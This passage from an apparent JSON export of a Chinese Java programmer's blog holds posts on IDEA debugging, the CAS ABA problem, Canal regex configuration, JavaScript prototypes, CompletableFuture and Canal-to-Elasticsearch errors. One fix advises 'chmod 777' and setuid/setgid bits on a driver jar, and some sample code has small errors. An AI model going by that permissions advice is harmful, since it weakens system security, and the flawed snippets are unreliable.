非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/22/%E3%80%90Java%E3%80%91Alibaba%E5%88%86%E5%B1%82%E9%A2%86%E5%9F%9F%E6%A8%A1%E5%9E%8B%E8%A7%84%E7%BA%A6/"},{"title":"【IDEA】IDEA的debug调试技巧详解","text":"# 【IDEA】IDEA 的 debug 调试技巧详解（转自 CSDN） 目录 一、概述 二、debug 操作分析 1、打断点 2、运行 debug 模式 3、重新执行 debug 4、让程序执行到下一次断点后暂停 5、让断点处的代码再加一行代码 6、停止 debug 程序 7、显示所有断点 8、添加断点运行的条件 9、屏蔽所有断点 10、把光标移到当前程序运行位置 11、单步跳过 12、可以跳入方法内部的执行一行代码操作 13、跳出方法 14、直接执行到光标所在位置 15、在控制台改变正在 debug 的数据 # 一、概述 debug 调试也叫断点调试 在程序的某一行打上断点，则在 debug 模式下运行到断点位置时会暂停，便于程序员观察代码的执行情况 学会 debug，有助于在程序运行未达到理想情况时，对程序的各个流程进行分析 本文只详细描述了 debug 的一些基本的常用操作，如果有缺漏欢迎评论区留言～ # 二、debug 操作分析 # 1、打断点 在程序的某一行位置，数字右边的空白部分使用鼠标左键点击一下，出现红点即为打上了一个断点 # 2、运行 debug 模式 方式一 选中要进行 debug 的程序，点击右上角的 debug 按钮 方式二 在要进行 debug 的程序处右键，选中下图选项 # 3、重新执行 debug 点击下图按钮，会关闭当前 debug 的程序并重新启动 debug # 4、让程序执行到下一次断点后暂停 点击下图的按钮，debug 会继续运行程序，直到遇到下一次断点后暂停 举例 下图是一个循环操作，在打断点的位置点击上面说的按钮，相当于再循环一次，到代码第 9 行时停止 # 5、让断点处的代码再加一行代码 点击下图的加号，可以在断点处加一行代码，比如下图中的 count++ 即为新添加的代码 选中 count++，右键点击 Edit 可以编辑该代码 选中该行代码（count++），点击加号下面的减号，可以删除该行代码 选中下图的眼镜，变为分屏操作 举例 下图是没添加额外代码之前的截图 添加一句 count++，并点击左边红色框中的按钮，执行到下一次断点，即循环了一次 效果和运行步骤见下图 # 6、停止 debug 程序 点击下图按钮停止 debug 程序 注意 运行的如果是 javaSE 项目，点一下就停止 运行的如果是 javaWeb 项目，需要点两下 第一下停止代码的当前线程 第二下停止服务器 # 7、显示所有断点 点击下图按钮，会显示所有断点 点击后出现下图所示界面，可以添加断点运行的条件，见下一条功能解释 # 8、添加断点运行的条件 选中断点，右键后即可编辑断点运行的条件 满足条件时程序才会在该断点处停下 比如添加 i&gt;=5，重新 debug 后的效果如下图所示 此时会发现第 7 条显示所有断点信息处，可以看到下图效果 # 9、屏蔽所有断点 点击下图按钮，可以屏蔽所有断点 屏蔽前 屏蔽后 屏蔽的断点在 debug 的时候不会运行 如果程序调试后觉得没问题了，可以屏蔽掉所有断点继续运行程序查看效果 # 10、把光标移到当前程序运行位置 点击下图按钮后，会把鼠标光标移动到当前程序运行位置 当程序代码量很大的时候，可以通过该按钮快速定位到程序运行位置 如下图所示 假设程序运行到第 9 行断点处，鼠标光标在第 11 行，点击该按钮后光标就会移动到第 9 行 # 11、单步跳过 点击下图按钮，会一行一行执行自己编写的代码 如果碰到方法，该按钮不会进入到该方法内部 快捷键 F8 # 12、可以跳入方法内部的执行一行代码操作 下图中的蓝色箭头和红色箭头都可以执行一行代码，如果遇到方法时会进入方法内部，区别在于 蓝色箭头只会跳进自己写的方法，如果是系统已经写好的方法，蓝色箭头无法跳入该方法 红色箭头不管是自己写的方法，还是系统已经定义好的方法，都可以跳入方法内部 如下图所示 ArrayList 的 add 方法是系统已经写好的，蓝色箭头无法跳入方法内部，但是红色箭头可以跳入方法内部 printMessage（）是自定义方法，红色和蓝色箭头都可以跳入该方法内部 # 13、跳出方法 下图的两个按钮都可以跳出方法 第二个按钮是关闭窗口的意思，同样可以起到跳出方法的作用 在进入方法内部的时候使用这两个按钮 # 14、直接执行到光标所在位置 点击下图的按钮，程序会执行到光标所在的位置 前提是光标前面没有断点，否则程序还是会在光标前面的断点处暂停 # 15、在控制台改变正在 debug 的数据 在控制台选中某个变量，右键点击 Set Value 可以改变该变量的值 如果想测试某个地方的数据如果是正确的会是什么效果，可以手动更改该处变量的值 补充：debug 调试看代码时，一般用 F9 跳到下一个断点，打断点的目的是你想看程序执行到这个位置时会有什么效果，或者是到达断点的位置后再继续往下看实现的过程；用 F7 去跳进方法内部，看具体的实现细节；用 F8 去看当前位置代码往下的执行情况（不跳入具体方法的内部） # 原文链接：https://blog.csdn.net/future_god_qr/article/details/121250865 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/05/05/%E3%80%90IDEA%E3%80%91IDEA%E7%9A%84debug%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3/"},{"title":"CAS-ABA问题","text":"# CAS-ABA 问题 # 一。概述： ​ ABA 问题是在多线程并发的情况下，发生的一种现象。上一次记录了有关 CAS 操作的一些知识，CAS 通过比较内存中的一个数据是否是预期值，如果是就将它修改成新值，如果不是则进行自旋，重复比较的操作，直到某一刻内存值等于预期值再进行修改。而 ABA 问题则是在 CAS 操作中存在的一个经典问题，这个问题某些时候不会带来任何影响，某些时候却是影响很大的。 # 二。什么是 ABA 问题？ # 理解一： ​ 当执行 campare and swap 会出现失败的情况。例如，一个线程先读取共享内存数据值 A，随后因某种原因，线程暂时挂起，同时另一个线程临时将共享内存数据值先改为 B，随后又改回为 A。随后挂起线程恢复，并通过 CAS 比较，最终比较结果将会无变化。这样会通过检查，这就是 ABA 问题。 在 CAS 比较前会读取原始数据，随后进行原子 CAS 操作。这个间隙之间由于并发操作，最终可能会带来问题。 # 理解二: “ABA” 问题：假设 t1 线程工作时间为 10 秒，t2 线程工作时间为 2 秒，那么可能在 A 的工作期间，主内存中的共享变量 A 已经被 t2 线程修改了多次，只是恰好最后一次修改的值是该变量的初始值，虽然用 CAS 判定出来的结果是期望值，但是却不是原来那个了 =======》“狸猫换太子” 相当于是只关心共享变量的起始值和结束值，而不关心过程中共享变量是否被其他线程动过。 有些业务可能不需要关心中间过程，只要前后值一样就行，但是有些业务需求要求变量在中间过程不能被修改。 只靠 CAS 无法保证 ABA 问题，需要使用 “原子引用” 才能解决！！！！ # 三.ABA 问题的解决： # 原子引用：（存在 ABA 问题） 案例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546 package InterviewTest;import java.util.concurrent.atomic.AtomicReference;class User{ String name; int age; public User(String name,int age) { this.name=name; this.age=age; } @Override public String toString() { return &quot;User [name=&quot; + name + &quot;, age=&quot; + age + &quot;]&quot;; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } }public class AtomicReferenceDemo { public static void main(String[] args) { User z3 = new User(&quot;z3&quot;,25); User li4 = new User(&quot;li4&quot;,25); AtomicReference&lt;User&gt; atomicReference = new AtomicReference&lt;&gt;(); atomicReference.set(z3); System.out.println(atomicReference); System.out.println(atomicReference.compareAndSet(z3, li4)+ &quot; &quot;+atomicReference.get().toString()); System.out.println(atomicReference.compareAndSet(li4, z3)+ &quot; &quot;+atomicReference.get().toString()); }} # 带版本号的原子引用（解决 ABA 问题） AtomicStampedReference 版本号原子引用： 案例：两种原子引用的对比 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package InterviewTest;import java.util.concurrent.atomic.AtomicReference;import java.util.concurrent.atomic.AtomicStampedReference;public class ABADemo { static AtomicReference&lt;Integer&gt; atomicReference = new AtomicReference&lt;&gt;(100); static AtomicStampedReference&lt;Integer&gt; atomicStampedReference = new AtomicStampedReference&lt;&gt;(100,1); public static void main(String[] args) { System.out.println(&quot;************以下是ABA问题的产生**************&quot;); new Thread(()-&gt;{ atomicReference.compareAndSet(100, 101); atomicReference.compareAndSet(101, 100); },&quot;t1&quot;).start(); new Thread(()-&gt;{ try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(atomicReference.compareAndSet(100, 2019) +&quot; &quot;+atomicReference.get()); },&quot;t2&quot;).start(); try { Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;************以下是ABA问题的解决**************&quot;); new Thread(()-&gt;{ int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() +&quot; &quot;+&quot; 第一次版本号：&quot;+stamp); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp()+1); System.out.println(Thread.currentThread().getName() +&quot; &quot;+&quot; 第2次版本号：&quot;+atomicStampedReference.getStamp()); atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp()+1); System.out.println(Thread.currentThread().getName() +&quot; &quot;+&quot; 第3次版本号：&quot;+atomicStampedReference.getStamp()); },&quot;t3&quot;).start(); new Thread(()-&gt;{ int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() +&quot; &quot;+&quot; 第一次版本号：&quot;+stamp); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } boolean result = atomicStampedReference.compareAndSet( 100, 2019, stamp, stamp+1); System.out.println(Thread.currentThread().getName()+ &quot; 修改成功否：&quot;+result+&quot; 当前最新实际版本号：&quot; +atomicStampedReference.getStamp()); System.out.println(Thread.currentThread().getName()+ &quot; 当前实际最新值：&quot; +atomicStampedReference.getReference()); },&quot;t4&quot;).start(); }}输出:************以下是ABA问题的产生**************true 2019************以下是ABA问题的解决**************t3 第一次版本号：1t4 第一次版本号：1t3 第2次版本号：2t3 第3次版本号：3t4 修改成功否：false 当前最新实际版本号：3t4 当前实际最新值：100 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/04/05/%E3%80%90Java%E3%80%91CAS-ABA%E9%97%AE%E9%A2%98/"},{"title":"Canal数据同步，接收不到Rowdata类型","text":"# Canal 数据同步，接收不到 Rowdata 类型 问题描述如下图，只能接收到 TRANSACTIONBEGIN 和 TRANSACTIONEND 日志，收不到 ROWDATA 类型数据，所以问题还是出在正则表达式身上。由于我本身客户端也有一份订阅正则表达式，覆盖了本身的正则表达式，一度改为 .*\\\\..* 也不好使，所以一开始被迷惑掉了。我们再回顾一下他的规范 常见例子： 1. 所有表：.* or .*\\\\..* 2. canal schema下所有表： canal\\\\..* 3. canal下的以canal打头的表：canal\\\\.canal.* 4. canal schema下的一张表：canal\\\\.test1 5. 多个规则组合使用：canal\\\\..*,mysql.test1,mysql.test2 (逗号分隔) 我们在覆盖客户端的订阅的时候，他在有的 Issue 上或者很多博客中也有回复使用 .*\\\\..* 会覆盖服务端配置，这样确实会，但是这样会所有的表都不能匹配到该正则上。 # 问题发现 发现问题是在修改了五六个小时之后回家睡觉的第二个早上，静下心来又分析了一次日志发现了问题所在。 下面图表示我的服务器端配置正则 (没有问题正确的), 客户端的正则 (有问题的)。昨天心态崩了没有发现这一点细节。Cananl 文档中是有提的库和表中间有两个 \\，其中一个就是用来转义的作用 (毕竟服务器端读取配置需要读取文件并进行编码)。 在客户端订阅的时候官方文档示例也是两个 \\，如下图。所以理所当然的就将两个 \\ 的订阅配置加入客户端配置中。但是，就会出现上面的日志，客户端的错误订阅 (多了一个) 正则刷新掉了服务端的正确正则导致所有的表都被过滤掉了，就发生了只会出现事务日志的问题。 # 正确客户端配置 声明环境，我的配置都是在 nacos 上，所以转义符对我来说没有意义，所以我的正则为 .*\\..* 也就是去掉一个 \\。比如我监控的 monitor 库中 monitor 开头的表就是 monitor\\.monitor.* 即可。下面成功。 还有一个注意点就是 如果你直接写到代码中的订阅也不需要加转义符，请忽略官方文档的那行代码示例 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/12/18/%E3%80%90Java%E3%80%91Canal%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%EF%BC%8C%E6%8E%A5%E6%94%B6%E4%B8%8D%E5%88%B0Rowdata%E7%B1%BB%E5%9E%8B/"},{"title":"【JavaScript】JavaScript原型链","text":"# 【JavaScript】JavaScript 原型链 # 2023/4/17 重温一下多年前的八股文 # 对象 要清楚原型链，首先要弄清楚对象： 普通对象 最普通的对象：有__proto__属性（指向其原型链），没有 prototype 属性。 原型对象 (Person.prototype 原型对象还有 constructor 属性（指向构造函数对象）) 函数对象： 凡是通过 new Function () 创建的都是函数对象。 拥有__proto__、prototype 属性（指向原型对象）。 Function、Object、Array、Date、String、自定义函数 特例： Function.prototype (是原型对象，却是函数对象，下面会有解释) 12345678910111213//函数对象 function F1(){}; var F2 = function(){}; var F3 = function(&quot;n1&quot;,&quot;n2&quot;,&quot;return n1+n2&quot;); console.log(typeof F1); //function console.log(typeof F2); //function console.log(typeof F3); //function console.log(typeof Object); //function console.log(typeof Array); //function console.log(typeof String); //function console.log(typeof Date); //function console.log(typeof Function); //function Array 是函数对象，是 Function 的实例对象，Array 是通过 newFunction 创建出来的。因为 Array 是 Function 的实例，所以 Array.proto === Function.prototype 12345678//普通对象 var o1 = new F1(); var o2 = {}; var o3 = new Object(); console.log(typeof o1); //Object console.log(typeof o2); //Object console.log(typeof o3); //Object # 原型对象 每创建一个函数都会有一个 prototype 属性，这个属性是一个指针，指向一个对象（通过该构造函数创建实例对象的原型对象）。原型对象是包含特定类型的所有实例共享的属性和方法。原型对象的好处是，可以让所有实例对象共享它所包含的属性和方法。 第一块中有提到，原型对象属于普通对象。Function.prototype 是个例外，它是原型对象，却又是函数对象，作为一个函数对象，它又没有 prototype 属性。 123456function Person(){}; console.log(typeof Person.prototype) //Object console.log(typeof Object.prototype) // Object console.log(typeof Function.prototype) // 特殊 Function console.log(typeof Function.prototype.prototype) //undefined 函数对象却没有prototype属性 解释： 其实原型对象就是构造函数的一个实例对象。person.prototype 就是 person 的一个实例对象。相当于在 person 创建的时候，自动创建了一个它的实例，并且把这个实例赋值给了 prototype。 1234567function Person(){}; var temp = new Person(); Person.prototype = temp; function Function(){}; var temp = new Function(); Function.prototype = temp; //由new Function()产生的对象都是函数对象 从一张图看懂原型对象、构造函数、实例对象之间的关系 1234567891011121314function Dog(){}; Dog.prototype.name = &quot;小黄&quot;; Dog.prototype.age = 13; Dog.prototype.getAge = function(){ return this.age; } var dog1 = new Dog(); var dog2 = new Dog(); dog2.name = &quot;小黑&quot;; console.log(dog1.name); // 小黄 来自原型 console.log(dog2.name); // 小黑 来自实例 1234567891011121314//图中的一些关系 dog1.__proto__ === Dog.prototype Dog.prototype.__proto__ === Object.prototype //继承Object 下面原型链说 dog1.__proto__.__proto__ === Object.prototype Dog.prototype.constructor === Dog Dog.prototype.isPrototypeOf(dog1) //获取对象的原型 dog1.__proto__ //不推荐 Object.getPrototypeOf(dog1) === Dog.prototype //推荐 # 原型链 原型链是实现继承的主要方法。 先说一下继承，许多 OO 语言都支持两张继承方式：接口继承、实现继承。 |- 接口继承：只继承方法签名 |- 实现继承：继承实际的方法 由于函数没有签名，在 ECMAScript 中无法实现接口继承，只支持实现继承，而实现继承主要是依靠原型链来实现。 原型链基本思路： 利用原型让一个引用类型继承另一个引用类型的属性和方法。 每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数想指针 (constructor)，而实例对象都包含一个指向原型对象的内部指针 (proto)。如果让原型对象等于另一个类型的实例，此时的原型对象将包含一个指向另一个原型的指针 (proto)，另一个原型也包含着一个指向另一个构造函数的指针 (constructor)。假如另一个原型又是另一个类型的实例…… 这就构成了实例与原型的链条。 原型链基本思路（图解）： 举例说明： 12345678910111213141516171819202122function Animal(){ this.type = &quot;animal&quot;; } Animal.prototype.getType = function(){ return this.type; } function Dog(){ this.name = &quot;dog&quot;; } Dog.prototype = new Animal(); Dog.prototype.getName = function(){ return this.name; } var xiaohuang = new Dog(); //原型链关系 xiaohuang.__proto__ === Dog.prototype Dog.prototype.__proto__ === Animal.prototype Animal.prototype.__proto__ === Object.prototype Object.prototype.__proto__ === null 图解: 详细图 （图片修正：笔误，第一行应该是 xiaohuang.proto === Dog.prototype） 从 xiaohuang 这个实例，看出整个链条 总结： Xiaohuang 这个 Dog 的实例对象继承了 Animal，Animal 继承了 Object。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/12/10/%E3%80%90JavaScript%E3%80%91JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE/"},{"title":"CompletableFuture使用文档","text":"背景： CompletableFuture 字面翻译过来，就是 “可完成的 Future”。同传统的 Future 相比较，CompletableFuture 能够主动设置计算的结果值（主动终结计算过程，即 completable），从而在某些场景下主动结束阻塞等待。而 Future 由于不能主动设置计算结果值，一旦调用 get () 进行阻塞等待，要么当计算结果产生，要么超时，才会返回。 CompletableFuture 说白了其实就是为了解决 Future 的问题（阻塞），而生！！！ 下面总结 CompletableFuture 的常用 api 创建 CompletableFuture 实例方法： //实例方法 CompletableFuture&lt;String&gt; completableFutureOne = new CompletableFuture&lt;&gt;(); Supplier&lt;?&gt; task=new Supplier&lt;Object&gt;() { @Override public Object get() { return null; } }; CompletableFuture&lt;?&gt; completableFuture = completableFutureOne.supplyAsync(task); 静态方法： public static void main(String[] args) throws ExecutionException, InterruptedException { Runnable runnable = () -&gt; System.out.println (“执行无返回结果的异步任务”); System.out.println(CompletableFuture.runAsync(runnable).get()); CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; { System.out.println(&quot;执行有返回值的异步任务&quot;); return &quot;Hello World&quot;; }); String result = future.get(); System.out.println(result); } # 2、whenComplete - 第一个任务结束，对其结果处理 (handly 的作用一样) 结果处理就是当 future 任务完成时，对任务的结果做处理工作！或异常情况处理！ 1234567891011121314151617181920212223242526272829public static void main(String[] args) throws ExecutionException, InterruptedException { CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(() -&gt; { try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { } System.out.println(&quot;执行结束1！&quot;); return 5; }); future.whenComplete(new BiConsumer&lt;Integer, Throwable&gt;() { @Override public void accept(Integer t, Throwable action) { t=t+1;// int i = 12 / 0; System.out.println(&quot;执行完成2！&quot;+action.getMessage()); } }) .exceptionally(new Function&lt;Throwable, Integer&gt;() { @Override public Integer apply(Throwable t) { System.out.println(&quot;执行失败3：&quot; + t.getMessage()); return null; } }).join(); Integer integer = future.get(); System.out.println(&quot;=&gt;integer&quot;+integer); } 1、whenComplete 只是对任务运行结束后，拿到任务结果，做个处理，并且如果任务执行有异常，会监听到异常！ 2、如果 whenComplete 本身有异常，那么需要单独加 exceptionally 来监听异常！ 3、最终 future.get () 拿到的还是任务 1 的结果 4、如果任务有异常，future.get () 拿到会抛出异常！ 12345678910111213141516执行结束1！执行失败3：java.lang.ArithmeticException: / by zeroException in thread &quot;main&quot; java.util.concurrent.ExecutionException: java.lang.ArithmeticException: / by zero at java.util.concurrent.CompletableFuture.reportGet(CompletableFuture.java:357) at java.util.concurrent.CompletableFuture.get(CompletableFuture.java:1895) at top.lisicheng.wmd.CompleableFutureTest2.main(CompleableFutureTest2.java:83)Caused by: java.lang.ArithmeticException: / by zero at top.lisicheng.wmd.CompleableFutureTest2.lambda$main$0(CompleableFutureTest2.java:65) at java.util.concurrent.CompletableFuture$AsyncSupply.run$$$capture(CompletableFuture.java:1590) at java.util.concurrent.CompletableFuture$AsyncSupply.run(CompletableFuture.java) at java.util.concurrent.CompletableFuture$AsyncSupply.exec(CompletableFuture.java:1582) at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:157) # 3、thenApply - 第一个任务结束，可能还有第二、第三个任务，且后面一个任务，需要用到前面任务的返回值 1234567891011121314151617181920212223242526public static void test4(String[] args) throws ExecutionException, InterruptedException { /** * public &lt;U&gt; CompletableFuture&lt;U&gt; thenApply(Function&lt;? super T,? extends U&gt; fn) * public &lt;U&gt; CompletableFuture&lt;U&gt; thenApplyAsync(Function&lt;? super T,? extends U&gt; fn) * public &lt;U&gt; CompletableFuture&lt;U&gt; thenApplyAsync(Function&lt;? super T,? extends U&gt; fn, Executor executor) * 总结：thenApply 接收一个函数作为参数，使用该函数处理上一个CompletableFuture 调用的结果， * 并返回一个具有处理结果的Future对象。 * */ CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(() -&gt; { int result = 100; System.out.println(&quot;一阶段：&quot; + result); return result; }).thenApply(number -&gt; { int result = number * 3; System.out.println(&quot;二阶段：&quot; + result); return result; }).thenApply(number -&gt; { int result = number * 3; System.out.println(&quot;三阶段：&quot; + result); return result; }); System.out.println(&quot;最终结果：&quot; + future.get()); } # 4、thenCompose - 跟上面一样的作用： thenCompose 的参数为一个返回 CompletableFuture 实例的函数，该函数的参数是先前计算步骤的结果。 123public &lt;U&gt; CompletableFuture&lt;U&gt; thenCompose(Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn);public &lt;U&gt; CompletableFuture&lt;U&gt; thenComposeAsync(Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn) ;public &lt;U&gt; CompletableFuture&lt;U&gt; thenComposeAsync(Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn, Executor executor) ; 12345678910111213141516171819202122232425public static void main(String[] args) throws InterruptedException, ExecutionException { CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() { @Override public Integer get() { int number = new Random().nextInt(3); System.out.println(&quot;第一阶段：&quot; + number); return number; } }).thenCompose(new Function&lt;Integer, CompletionStage&lt;Integer&gt;&gt;() { @Override public CompletionStage&lt;Integer&gt; apply(Integer param) { return CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() { @Override public Integer get() { int number = param * 2; System.out.println(&quot;第二阶段：&quot; + number); return number; } }); } }); System.out.println(&quot;最终结果: &quot; + future.get());} 12345那么 thenApply 和 thenCompose 有何区别呢：thenApply 转换的是泛型中的类型，返回的是同一个CompletableFuture；thenCompose 将内部的 CompletableFuture 调用展开来并使用上一个CompletableFutre 调用的结果在下一步的 CompletableFuture 调用中进行运算，是生成一个新的CompletableFuture。 下面用一个例子对对比： 123456789public static void main(String[] args) throws InterruptedException, ExecutionException { CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; &quot;Hello&quot;); CompletableFuture&lt;String&gt; result1 = future.thenApply(param -&gt; param + &quot; World&quot;); CompletableFuture&lt;String&gt; result2 = future.thenCompose(param -&gt; CompletableFuture.supplyAsync(() -&gt; param + &quot; World&quot;)); System.out.println(result1.get()); System.out.println(result2.get());} # 5、结果消费 123thenAccept系列：对单个结果进行消费thenAcceptBoth系列：对两个结果进行消费thenRun系列：不关心结果，只对结果执行Action 只会拿到上个任务的值，然后对值进行消费，但是绝对不会产生新的值 这是跟上面任务中间 转换的，最大的区别 消费结果还包括 thenRun thenRun 跟 thenAccept 的区别是，它不仅不产生新的值，还不消费上个任务的值，只是自己做一个业务处理。 6、结果组合 thenCombine - 合并两个线程任务的结果，并进一步处理。 applyToEither - 两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的转化操作。 acceptEither - 两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的消费操作。 runAfterEither - 两个线程任务相比较，有任何一个执行完成，就进行下一步操作，不关心运行结果。 runAfterBoth - 两个线程任务相比较，两个全部执行完成，才进行下一步操作，不关心运行结果。 anyOf-anyOf 方法的参数是多个给定的 CompletableFuture，当其中的任何一个完成时，方法返回这个 CompletableFuture。 allOf-allOf 方法用来实现多 CompletableFuture 的同时返回。 代码实例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768@RestController@RequestMapping(&quot;/test&quot;)public class TestController { public static ExecutorService threadPool = new ThreadPoolExecutor( 10, 40, 20, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;Runnable&gt;( 16 )); /** * CompletableFuture 测试 * * @return */ @ApiOperation(&quot;CompletableFuture 测试&quot;) @PostMapping(&quot;test&quot;) public Object test() { Map&lt;Object, Object&gt; result = new HashMap&lt;&gt;(); CompletableFuture.allOf( CompletableFuture.runAsync(() -&gt; { System.out.println(&quot;执行1&quot;); result.put(&quot;key1&quot;, seslectData1()); }, threadPool), CompletableFuture.runAsync(() -&gt; { System.out.println(&quot;执行2&quot;); result.put(&quot;key2&quot;, seslectData2()); }, threadPool), CompletableFuture.runAsync(() -&gt; { System.out.println(&quot;执行3&quot;); result.put(&quot;key3&quot;, seslectData3()); }, threadPool) ).join(); return ResponseUtil.ok(result); } public String seslectData1() { try { Thread.sleep(500); } catch (InterruptedException e) { e.printStackTrace(); } return &quot;key1&quot;; } public String seslectData2() { try { Thread.sleep(500); } catch (InterruptedException e) { e.printStackTrace(); } return &quot;key2&quot;; } public String seslectData3() { try { Thread.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } return &quot;key3&quot;; }} # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/01/12/%E3%80%90Java%E3%80%91CompletableFuture%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/"},{"title":"【Java】Elastic canal数据同步到ES配置常见报错","text":"# 【Java】Elastic canal 数据同步到 ES 配置常见报错 # 0. 引言 所有报错均为博主在实操过程中遇到的错误和解决办法，如果有其他报错或者不同的解决办法，请留言告诉我 安装 canal 过程中遇到问题，先在本文中查询是否有相同报错，将会为你节约大量排错时间 # 环境 1234jdk1.8canal 1.1.5mysql8.0es7.13.0 # 1. Unknown system variable ‘query_cache_size’ 这是因为 mysql 驱动包的版本过低导致的，query cache 在 MySQL5.7.20 就已经过时了，而在 MySQL8.0 之后就已经被移除了 1、只需要将 lib 中的驱动器替换成 mysql-connector-java-8.0.22.jar 2、修改驱动器权限 12chmod 777 lib/mysql-connector-java-8.0.22.jarchmod +st lib/mysql-connector-java-8.0.22.jar 查看权限如图所示 1ll lib # 2. Reason: No converter found capable of converting from type [java.lang.String] to type [java.util.Map&lt;java.lang.String, java.lang.String&gt;] 启动 canal-adapter 报错： 123Failed to bind properties under 'canal.conf.canal-adapters[0].groups[0].outer-adapters[1].properties' to java.util.Map&lt;java.lang.String, java.lang.String&gt;: Reason: No converter found capable of converting from type [java.lang.String] to type [java.util.Map&lt;java.lang.String, java.lang.String&gt;] 解决： 观察报错信息可以得知是配置文件中的 outer2（0 基，所以 outer-adapter [1] 实际指的是 2）的 properties 配置有问题，我们观察配置文件，发现是 properties 下的 mode,cluster.name 等属性与 properties 同级了，将其如下图所示后退两字符即可。 # 3. RuntimeException: java.lang.RuntimeException: No data source found: xxxx 这个因为在 conf/es/xxx.yml 中配置的 dataSourceKey 并没有在 conf/application.yml 中的 srcDataSources 中维护 如下图所示，es 中的 dataSourceKey 需要在 applicaiton.yml 中设置，默认是 defaultDS # 4. Reason: Unable to set value for property src-data-sources 123Failed to bind properties under 'canal.conf' to com.alibaba.otter.canal.adapter.launcher.config.AdapterCanalConfig: Reason: Unable to set value for property src-data-sources 原因一： mysql 驱动器导致的问题，使用的数据库是 8.x。驱动器是 5.x 的，将 mysql 驱动替换为 8.0.x 版本的。如上所示报错 1 原因二： 检查该报错前的日志，是否有其他相关报错信息，比如无相关数据库，如下所示，根据其报错内容来检查配置项并且调整即可 # 5. java.sql.SQLException: null, message from server: “Host ‘172.16.188.2’ is blocked because of many connection errors; unblock with ‘mysqladmin flush-hosts’” 同一个 ip 在短时间内产生太多中断的数据库连接而导致的阻塞 登录对应的 mysql，执行如下指令 1flush hosts; # 6. IllegalStateException: Extension instance(name: es7, class: interface com.alibaba.otter.canal.client.adapter.OuterAdapter) could not be instantiated: class could not be found 一般 could not be instantiated: class could not be found 这样的报错是配置文件的问题，如上的报错可以看到是 name: es7 中的错误，在官方的示例文档中使用的是 name: es6 # or es7 。 在 canal1.1.5 + 版本中设置的是 name: es6 # 或者 es7 但在 1.1.4 版本中直接使用 name: es 即可 # 7. IllegalArgumentException: Not found the mapping info of index: user 1、这个报错是 ES 的 mapping 设置的问题，确保 es 中有该索引，并且确认是否有部分字段没有在 es 中设置 mapping, 这个要对应之前设置的 sql，以及 es 中的 mappings 来解决 2、使用了 elasticsearch 7.x，但 adapter1.1.4 默认支持 es6.x 解决方案： （1）修改 adapter 源码，将 es 依赖调整为 7.x；参考博客 adapter1.1.4 修改源码支持 es7.x （2）换成 adapter1.1.5 # 8. IllegalArgumentException: Illegal character in scheme name at index 0: 172.16.188.7:9200 如果连接 es 使用的是 rest 方式，那么 hosts 中的 ip 前要添加 http:// ，如 1hosts: http://172.16.188.7:9200 # 9. com.alibaba.druid.pool.DruidDataSource cannot be cast to com.alibaba.druid.pool.DruidDataSource 